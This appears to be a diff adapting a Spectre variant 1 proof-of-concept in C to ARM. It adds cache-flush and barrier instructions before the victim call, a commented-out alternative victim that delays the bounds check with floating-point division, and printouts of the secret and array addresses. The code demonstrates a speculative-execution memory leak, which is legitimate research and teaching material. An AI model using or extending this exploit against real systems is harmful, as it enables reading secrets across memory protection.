@@ -122,6 +122,14 @@ void victim_function(size_t x) {
     temp &= array2[array1[x] * 512];
   }
 }
+// void victim_function(size_t x) {
+//     /* STALL the branch check using slow FP division */
+//     volatile float stall = (float)x / (float)array1_size;
+//     if (stall < 1.0) {
+//         /* ENSURE BARRIERS ARE REMOVED TO ALLOW LEAK */
+//         temp &= array2[array1[x] * 512];
+//     }
+// }
 
 
 /********************************************************************
@@ -212,6 +220,12 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       x = (x | (x >> 16));
       x = training_x ^ (x & (malicious_x ^ training_x));
 
+      __asm volatile("dc civac, %0" : : "r"(&array1_size): "memory");
+
+      __asm volatile("dc civac, %0" : : "r"(&x): "memory");
+
+      __asm volatile("dsb sy\n\tisb" ::: "memory");
+
       /* Call the victim! */
       victim_function(x);
 
@@ -287,6 +301,7 @@ int main(int argc,
 
   /* Default for malicious_x is the secret string address */
   size_t malicious_x = (size_t)(secret - (char * ) array1);
+  printf("Calculated malicious_x offset: %ld\n", (long)malicious_x);
   
   /* Default addresses to read is 40 (which is the length of the secret string) */
   int len = 40;
@@ -353,6 +368,9 @@ int main(int argc,
   #endif
 
   printf("\n");
+
+  printf("Target Secret Address: %p\n", (void *)secret);
+  printf("Base Array1 Address: %p\n", (void *)array1);
 
   printf("Reading %d bytes:\n", len);
 
